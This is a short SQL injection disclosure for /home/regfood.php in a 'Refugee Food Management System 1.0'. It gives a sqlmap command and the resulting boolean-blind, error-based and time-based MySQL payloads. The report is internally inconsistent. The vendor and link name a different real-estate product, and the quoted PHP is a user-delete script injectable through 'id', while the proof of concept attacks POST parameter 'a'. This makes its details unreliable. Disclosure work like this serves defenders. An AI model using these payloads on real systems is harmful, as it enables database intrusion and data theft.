# SQLi in code-projects Refugee Food Management System 1.0 of file /home/regfood.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /home/regfood.php

**Version**

- V1.0

**Description**

A vulnerability was determined in code-projects Refugee Food Management System 1.0. The affected element is an unknown function of the file /home/regfood.php. This manipulation of the argument a causes sql injection. The attack is possible to be carried out remotely. The exploit has been publicly disclosed and may be utilized.

### Analyse

**injection point: id**

```php
<?php
include("config.php");
$uid = $_GET['id'];

// view code//
$sql = "SELECT * FROM user where uid='$uid'";
$result = mysqli_query($con, $sql);
while($row = mysqli_fetch_array($result))
	{
	  $img=$row["uimage"];
	}
@unlink('user/'.$img);

//end view code
$msg="";
$sql = "DELETE FROM user WHERE uid = {$uid}";
$result = mysqli_query($con, $sql);
if($result == true)
{
	$msg="<p class='alert alert-success'>Builder Deleted</p>";
	header("Location:userbuilder.php?msg=$msg");
}
else
{
	$msg="<p class='alert alert-warning'>Builder not Deleted</p>";
		header("Location:userbuilder.php?msg=$msg");
}

mysqli_close($con);
?>

```

### POC

```bash
sqlmap -u "http://192.168.93.1/Refugee/home/regfood.php" --data="a=test&b=1&c=1&Register=Register" --dbms=mysql --level=2 --thread=10 --batch
```

```bash
---
Parameter: a (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: a=test' RLIKE (SELECT (CASE WHEN (3432=3432) THEN 0x74657374 ELSE 0x28 END)) AND 'rshY'='rshY&b=1&c=1&Register=Register

    Type: error-based
    Title: MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)
    Payload: a=test' OR GTID_SUBSET(CONCAT(0x717a707a71,(SELECT (ELT(2968=2968,1))),0x716b767171),2968) AND 'bavg'='bavg&b=1&c=1&Register=Register

    Type: time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: a=test' OR (SELECT 8130 FROM (SELECT(SLEEP(5)))PzYR) AND 'REvT'='REvT&b=1&c=1&Register=Register
---
```

![image-20251224171326624](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512241713689.png)